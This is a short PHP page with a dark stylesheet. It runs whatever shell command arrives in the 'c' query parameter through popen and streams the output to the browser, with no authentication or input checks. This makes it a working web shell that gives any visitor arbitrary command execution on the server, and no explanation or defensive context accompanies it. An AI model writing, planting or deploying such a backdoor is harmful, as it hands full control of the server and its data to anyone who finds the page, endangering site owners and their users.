<style>
body{
	background:#333;
	color:#EEE;
}
</style>
<pre>
<?php
error_reporting(E_ALL^E_NOTICE);
if(!$_GET['c']){
	echo "No command";
}else{
$cmd=$_GET['c'];
while(@ob_end_flush()); // end all output buffers if any

$proc = popen($cmd, 'r');
while (!feof($proc))
{
    echo fread($proc, 4096);
    @flush();
}
}
?>
</pre>